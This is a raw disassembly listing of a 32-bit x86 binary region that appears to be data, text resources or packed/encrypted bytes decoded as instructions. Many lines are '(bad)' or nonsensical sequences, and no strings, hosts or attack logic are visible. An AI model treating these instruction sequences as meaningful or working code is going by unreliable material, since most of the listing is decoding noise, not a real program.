  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	hlt    
  413bf5:	add    DWORD PTR [ebx+0x0],eax
  413bf8:	pop    ecx
  413bf9:	dec    ecx
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    BYTE PTR [edx+0x12],ch
  413c46:	inc    ebx
  413c47:	add    BYTE PTR [eax],al
  413c49:	add    BYTE PTR [eax],al
  413c4b:	add    BYTE PTR [eax+eax*1+0x46],al
  413c4f:	add    BYTE PTR [ecx+0x0],ch
  413c52:	outs   dx,DWORD PTR ds:[esi]
  413c53:	add    BYTE PTR [edx+0x0],cl
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	faddp  st(6),st
  413f02:	retf   0xdc69
  413f05:	rol    DWORD PTR [eax],1
  413f07:	add    BYTE PTR [ecx+eax*1],al
  413f0a:	add    BYTE PTR [eax],al
  413f0c:	into   
  413f0d:	in     al,0x17
  413f0f:	push   cs
  413f10:	fnsave [esi]
  413f12:	fnstcw WORD PTR [eax]
  413f14:	fisubr WORD PTR [ebp-0x6139b2be]
  413f1a:	jb     0x413f14
  413f1c:	stos   BYTE PTR es:[edi],al
  413f1d:	sti    
  413f1e:	xchg   ebp,eax
  413f1f:	aaa    
  413f20:	leave  
  413f21:	std    
  413f22:	iret   
  413f23:	dec    ebx
  413f24:	ret    0x2f91
  413f27:	ret    
  413f28:	arpl   di,dx
  413f2a:	daa    
  413f2b:	jecxz  0x413f1c
  413f2d:	data16 rol BYTE PTR [ebx+0x726c98c5],0xf
  413f35:	add    ah,ch
  413f37:	dec    esp
  413f38:	in     eax,0x99
  413f3a:	push   es
  413f3b:	inc    eax
  413f3c:	lds    esi,FWORD PTR [ecx+eiz*1]
  413f3f:	sbb    BYTE PTR [esi+eiz*1],al
  413f42:	or     al,0xbd
  413f44:	and    DWORD PTR [ebp-0x24aebcc6],ebx
  413f4a:	stos   DWORD PTR es:[edi],eax
  413f4b:	imul   esp,DWORD PTR [edi],0x9b079a6d
  413f51:	mov    dl,0xe5
  413f53:	mov    bl,BYTE PTR [ecx-0x665cf93]
  413f59:	in     eax,0x6f
  413f5b:	cmp    BYTE PTR [edx],al
  413f5d:	xor    al,0xea
  413f5f:	adc    dh,ah
  413f61:	mov    edi,0x364a7a52
  413f66:	dec    ebp
  413f67:	inc    ecx
  413f68:	jmp    0x413eeb
  413f6a:	retf   
  413f6b:	or     bl,al
  413f6d:	sti    
  413f6e:	adc    edx,DWORD PTR [eax+ebp*2+0xa]
  413f72:	sub    eax,0xc037fc1d
  413f77:	lahf   
  413f78:	fidiv  WORD PTR [edx+0x3a2b563b]
  413f7e:	and    edx,edi
  413f80:	lds    ebx,FWORD PTR [edx+eax*1-0xff8da2e]
  413f87:	inc    ecx
  413f88:	push   es
  413f89:	fimul  WORD PTR [edi+0x39c5c514]
  413f8f:	add    BYTE PTR [esi+0x43083539],dh
  413f95:	cld    
  413f96:	and    al,0xba
  413f98:	dec    esp
  413f99:	mov    edx,0xda4eb61c
  413f9e:	jbe    0x413f32
  413fa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fa1:	or     BYTE PTR [ebx-0x35],bl
  413fa4:	dec    esp
  413fa5:	jns    0x41401d
  413fa7:	push   ds
  413fa8:	(bad)  [edx-0x5e]
  413fab:	push   cs
  413fac:	mov    fs,WORD PTR [eax+0x6ca467bd]
  413fb2:	pcmpgtb mm4,QWORD PTR [ecx+0x1431e5f8]
  413fb9:	aam    0x76
  413fbb:	cmp    edx,esi
  413fbd:	sbb    BYTE PTR [ebx-0x3fced2e0],0x2f
  413fc4:	or     ebp,DWORD PTR [ebp+0x35]
  413fc7:	xchg   BYTE PTR [edx-0x2d9c86b],bl
  413fcd:	xchg   ebp,eax
  413fce:	inc    ebx
  413fcf:	xchg   BYTE PTR [eax],dl
  413fd1:	sbb    BYTE PTR [esi],cl
  413fd3:	mov    cs,WORD PTR [ebp-0x49]
  413fd6:	in     eax,dx
  413fd7:	cmp    eax,0x73af26d2
  413fdc:	dec    esi
  413fdd:	adc    al,0x74
  413fdf:	iret   
  413fe0:	sub    bl,BYTE PTR ds:0xfbc89b7b
  413fe6:	dec    eax
  413fe7:	add    al,0xe3
  413fe9:	daa    
  413fea:	mov    ch,0xbe
  413fec:	retf   
  413fed:	repnz xchg edi,eax
  413fef:	fld    TBYTE PTR [edi+0x658922ef]
  413ff5:	jge    0x41401f
  413ff7:	and    BYTE PTR [esp+edi*2],bl
  413ffa:	and    ah,ch
  413ffc:	inc    edi
  413ffd:	pusha  
  413ffe:	dec    ecx
  413fff:	fwait
  414000:	mov    bh,BYTE PTR [edi]
  414002:	pop    esp
  414003:	clc    
  414004:	leave  
  414005:	adc    al,0x9b
  414007:	sbb    DWORD PTR [ebp-0x59875c5f],eax
  41400d:	mov    dl,0x2a
  41400f:	push   esp
	...
  414074:	pop    edx
  414075:	ficom  DWORD PTR [esi+0x60]
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0x2f37:0x84d52e96
  414083:	or     ah,al
  414085:	rol    BYTE PTR [eax],cl
  414087:	add    BYTE PTR [ecx+eax*1],al
  41408a:	add    BYTE PTR [eax],al
  41408c:	arpl   sp,di
  41408e:	xchg   BYTE PTR [esi+ebx*2+0xb4fc23a],ah
  414095:	gs pusha 
  414097:	or     al,0x2c
  414099:	mov    bh,0xb7
  41409b:	xchg   DWORD PTR [esi-0x10],esp
  41409e:	add    DWORD PTR [ebx],edi
  4140a0:	fwait
  4140a1:	cld    
  4140a2:	sbb    BYTE PTR [eax+0x4f],bh
  4140a5:	pushf  
  4140a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140a7:	cmp    DWORD PTR [ebx],esp
  4140a9:	push   esi
  4140aa:	aam    0x49
  4140ac:	sar    DWORD PTR [ecx-0x545ca99a],1
  4140b2:	aad    0xba
  4140b4:	add    BYTE PTR [eax+0x6a6f3c38],dl
  4140ba:	in     eax,dx
  4140bb:	jl     0x41405e
  4140bd:	data16 mov al,0x2d
  4140c0:	mov    DWORD PTR [esi-0x27561a59],esp
  4140c6:	mov    dh,0x91
  4140c8:	fidivr WORD PTR ds:0x1fcfebee
  4140ce:	out    dx,eax
  4140cf:	dec    ebp
  4140d0:	daa    
  4140d1:	dec    edi
  4140d2:	iret   
  4140d3:	fimul  DWORD PTR [eax]
  4140d5:	(bad)  
  4140d6:	mov    es,WORD PTR [ebx+ebp*4]
  4140d9:	das    
  4140da:	mov    edx,0xb2d6d02b
  4140df:	mov    al,BYTE PTR [eax]
  4140e1:	lods   al,BYTE PTR ds:[esi]
  4140e2:	test   eax,0xec67c0f0
  4140e7:	push   edi
  4140e8:	data16 fst QWORD PTR [edi+0x698807bc]
  4140ef:	in     eax,dx
  4140f0:	push   edi
  4140f1:	mov    WORD PTR [edx+0x30024d4],gs
  4140f7:	and    edi,edi
  4140f9:	xchg   ebp,eax
  4140fa:	dec    ebp
  4140fb:	inc    esi
  4140fc:	add    esp,ebp
  4140fe:	push   ebx
  4140ff:	leave  
  414100:	data16 adc BYTE PTR [esi+0x7fac8913],0x2d
  414108:	(bad)  
  414109:	icebp  
  41410a:	jmp    0x4140ed
  41410c:	retf   0x23f3
  41410f:	sbb    BYTE PTR [ecx-0x7f3b9ed9],ah
  414115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414116:	loopne 0x414107
  414118:	rcr    BYTE PTR [edx-0x79135f2],cl
  41411e:	sbb    al,0x52
  414120:	fild   DWORD PTR [ebp+0x43]
  414123:	ffreep st(6)
  414125:	enter  0x9df9,0x39
  414129:	jmp    0x4140e9
  41412b:	mov    edx,0x8c5c5d48
  414130:	icebp  
  414131:	fcmove st,st(2)
  414133:	fdiv   QWORD PTR fs:[ebx+0x3]
  414137:	jmp    0xd9a6:0xb54f6c29
  41413e:	sub    DWORD PTR [ecx-0x305b2395],ebp
  414144:	ds inc edx
  414146:	xchg   edi,eax
  414147:	pop    ecx
  414148:	imul   ecx,esp,0xddecd3d
  41414e:	loope  0x414144
  414150:	xchg   edi,eax
  414151:	cmp    esp,esi
  414153:	cmp    ebp,esp
  414155:	jb     0x41413f
  414157:	pusha  
  414158:	inc    esi
  414159:	lahf   
  41415a:	(bad)  
  41415b:	pop    eax
  41415c:	xor    DWORD PTR [eax],eax
  41415e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41415f:	cld    
  414160:	aas    
  414161:	scas   eax,DWORD PTR es:[edi]
  414162:	inc    ebp
  414163:	pop    ds
  414164:	jae    0x4141cd
  414166:	mov    al,ds:0x116eb456
  41416b:	add    al,0xac
  41416d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41416e:	lds    esp,FWORD PTR [edi+0xe]
  414171:	jl     0x4141a7
  414173:	outs   dx,DWORD PTR ds:[esi]
  414174:	adc    dh,BYTE PTR [ebx+0x39]
  414177:	push   ds
  414178:	and    dh,BYTE PTR [ebx+0x5b]
  41417b:	or     bh,dh
  41417d:	in     al,dx
  41417e:	icebp  
  41417f:	push   0xffffffb8
  414181:	pop    edx
  414182:	fdivp  st(7),st
  414184:	(bad)  
  414185:	mov    ah,BYTE PTR ds:0x105f014c
  41418b:	fst    QWORD PTR [ecx]
  41418d:	xchg   esi,eax
  41418e:	sbb    esi,DWORD PTR [edi+0x0]
	...
  4141f4:	add    dl,BYTE PTR [edx]
  4141f6:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	cmp    DWORD PTR [ebp-0x59],0xffffffcf
  414204:	in     al,0xd3
  414206:	add    BYTE PTR [eax],al
  414208:	add    al,0x1
  41420a:	add    BYTE PTR [eax],al
  41420c:	pop    esp
  41420d:	enter  0x4208,0x42
  414211:	rol    bh,0x16
  414214:	sar    DWORD PTR [eax-0x7f],cl
  414217:	stos   BYTE PTR es:[edi],al
  414218:	jns    0x4141eb
  41421a:	jle    0x414247
  41421c:	jo     0x4141f1
  41421e:	mov    ah,0xb2
  414220:	mov    ecx,esi
  414222:	outs   dx,DWORD PTR ds:[esi]
  414223:	sub    al,0x5e
  414225:	xchg   DWORD PTR [ecx+0x56],ecx
  414228:	imul   ebx,DWORD PTR [edi],0xffffffe9
  41422b:	(bad)  
  41422c:	into   
  41422d:	xchg   esp,eax
  41422e:	leave  
  41422f:	sbb    DWORD PTR [eax-0x68c91766],edx
  414235:	ja     0x414219
  414237:	push   cs
  414238:	push   0x85b74cac
  41423d:	or     esi,esi
  41423f:	out    0x18,al
  414241:	pop    edx
  414242:	sbb    ebp,DWORD PTR [ebx]
  414244:	add    eax,0x1a0a9943
  414249:	enter  0x828e,0xd2
  41424d:	jnp    0x414238
  41424f:	xor    eax,0xcf36f76e
  414254:	scas   al,BYTE PTR es:[edi]
  414255:	push   ebp
  414256:	mov    cl,0x4b
  414258:	addr16 test eax,0x3ec0a53b
  41425e:	rcr    DWORD PTR [ecx-0x5cb050f2],cl
  414264:	jb     0x414275
  414266:	(bad)  
  414267:	jno    0x41426f
  414269:	mov    ds:0xff6e78e3,al
  41426e:	jns    0x4142e8
  414270:	push   es
  414271:	jno    0x414279
  414273:	dec    ebx
  414274:	cld    
  414275:	mov    DWORD PTR [ebx+0x11ce4b7c],ebx
  41427b:	ret    
  41427c:	dec    edx
  41427d:	iret   
  41427e:	pushf  
  41427f:	int3   
  414280:	inc    ebx
  414281:	jge    0x41422c
  414283:	mov    BYTE PTR [edi-0x6200f3c1],cl
  414289:	or     al,0x50
  41428b:	popa   
  41428c:	popf   
  41428d:	sti    
  41428e:	xor    BYTE PTR [ebp+0x2],cl
  414291:	es jmp 0x414249
  414294:	adc    eax,esi
  414296:	xchg   ecx,eax
  414297:	fisubr WORD PTR [edi+0x7b]
  41429a:	retf   0xff78
  41429d:	or     DWORD PTR [edx+0x78],0x7e
  4142a1:	push   ss
  4142a2:	jo     0x414261
  4142a4:	inc    ecx
  4142a5:	in     eax,0x46
  4142a7:	push   ebp
  4142a8:	push   edx
  4142a9:	nop
  4142aa:	push   ecx
  4142ab:	aas    
  4142ac:	add    eax,0xb9e1da1b
  4142b1:	push   ss
  4142b2:	pushf  
  4142b3:	rol    DWORD PTR [esi+0x6dcacd5f],cl
  4142b9:	sub    DWORD PTR [ecx+0x69390772],ebx
  4142bf:	push   0x65
  4142c1:	jecxz  0x4142a6
  4142c3:	sbb    DWORD PTR [ecx+0x6f],esp
  4142c6:	pushf  
  4142c7:	add    eax,0x158a9067
  4142cc:	mov    dl,0x5e
  4142ce:	xor    BYTE PTR [eax-0xb],al
  4142d1:	or     bh,dl
  4142d3:	sub    esp,esp
  4142d5:	inc    ebx
  4142d6:	out    0x5f,al
  4142d8:	or     DWORD PTR [eax-0x5c745f9d],ebx
  4142de:	imul   edi,ebx,0x25
  4142e1:	popf   
  4142e2:	pop    ebp
  4142e3:	lock mov eax,ds:0x75eac5c5
  4142e9:	sbb    dl,dh
  4142eb:	or     eax,DWORD PTR [esp+eiz*2+0x5]
  4142ef:	mov    al,0xa5
  4142f1:	jbe    0x41427f
  4142f3:	mov    ds:0x2687d45c,eax
  4142f8:	dec    esp
  4142f9:	mov    bh,0xbb
  4142fb:	daa    
  4142fc:	(bad)  
  4142fd:	test   DWORD PTR [ebp+0x2f],esp
  414300:	mov    ds:0xb178db1b,al
  414305:	(bad)  
  414307:	inc    ecx
  414308:	mov    esi,eax
  41430a:	adc    esi,DWORD PTR [edx+esi*2]
  41430d:	mov    ds:0xdd64,al
	...
  414372:	add    BYTE PTR [eax],al
  414374:	add    DWORD PTR [ecx-0x2122293],eax
  41437a:	mov    cl,0xdd
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	fdiv   DWORD PTR [eax-0x69]
  414383:	int    0xe8
  414385:	aam    0x0
  414387:	add    BYTE PTR [ecx+eax*1],al
  41438a:	add    BYTE PTR [eax],al
  41438c:	xchg   ah,ch
  41438e:	and    bh,cl
  414390:	xchg   edx,eax
  414392:	cmp    al,0xda
  414394:	or     edx,DWORD PTR [ebx+0x1de2567a]
  41439a:	mov    dh,0x4b
  41439c:	popf   
  41439d:	imul   edx,DWORD PTR [edx+0x7fd5d304],0x6b8ac53e
  4143a7:	pop    esi
  4143a8:	out    0x7c,eax
  4143aa:	je     0x4143eb
  4143ac:	jns    0x41434c
  4143ae:	xchg   edx,eax
  4143af:	sti    
  4143b0:	dec    edi
  4143b1:	je     0x414379
  4143b3:	call   0x2403290c
  4143b8:	outs   dx,BYTE PTR ds:[esi]
  4143b9:	jge    0x4143b3
  4143bb:	mul    BYTE PTR [edx]
  4143bd:	repz push eax
  4143bf:	adc    BYTE PTR [eax+eiz*2],dh
  4143c2:	mov    edi,0x2d6a6a92
  4143c7:	test   BYTE PTR [eax-0x64],0xf2
  4143cb:	push   ebp
  4143cc:	aas    
  4143cd:	fstp   DWORD PTR [ecx+0x649a6941]
  4143d3:	sub    al,0x69
  4143d5:	mov    ah,0xcd
  4143d7:	inc    eax
  4143d8:	fwait
  4143d9:	gs push esp
  4143db:	lahf   
  4143dc:	sbb    BYTE PTR [edi+edx*2],cl
  4143df:	xor    esp,eax
  4143e1:	lock mov eax,0x39e51fc0
  4143e7:	pop    edx
  4143e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143e9:	jle    0x41437f
  4143eb:	ds std 
  4143ed:	or     BYTE PTR [eax+0x5c],0xd
  4143f1:	enter  0x9cce,0x99
  4143f5:	and    al,BYTE PTR [ecx+0x645b4f42]
  4143fb:	jecxz  0x414452
  4143fd:	in     al,0xc3
  4143ff:	lods   eax,DWORD PTR ds:[esi]
  414400:	mov    ebx,0x24c193c1
  414405:	and    BYTE PTR [ecx+ebx*4-0x20],ch
  414409:	add    edi,esi
  41440b:	fisttp DWORD PTR ds:0xc01c40a3
  414411:	enter  0x1204,0x12
  414415:	adc    BYTE PTR [ebx],0xe4
  414418:	add    al,0xbe
  41441a:	cld    
  41441b:	inc    ebx
  41441c:	ds aam 0x67
  41441f:	push   cs
  414420:	fisubr WORD PTR [esi+0x72]
  414423:	call   0x11c0b332
  414428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414429:	cmc    
  41442a:	pop    ecx
  41442b:	test   al,0xbb
  41442d:	lods   eax,DWORD PTR ds:[esi]
  41442e:	fisubr DWORD PTR [ecx-0x2f]
  414431:	xchg   ecx,eax
  414432:	xchg   edi,eax
  414433:	pop    ecx
  414434:	(bad)  
  414435:	repnz xlat BYTE PTR ds:[ebx]
  414437:	pop    ecx
  414438:	mov    edx,0x23db55ba
  41443d:	or     DWORD PTR [esi],0x75
  414440:	ret    
  414441:	je     0x414444
  414443:	cld    
  414444:	bnd je 0x41443a
  414447:	(bad)  [eax+0x2e]
  41444a:	les    esi,FWORD PTR [edi+0x2a0493a9]
  414450:	push   esi
  414451:	dec    eax
  414452:	push   esp
  414453:	call   0x9d809beb
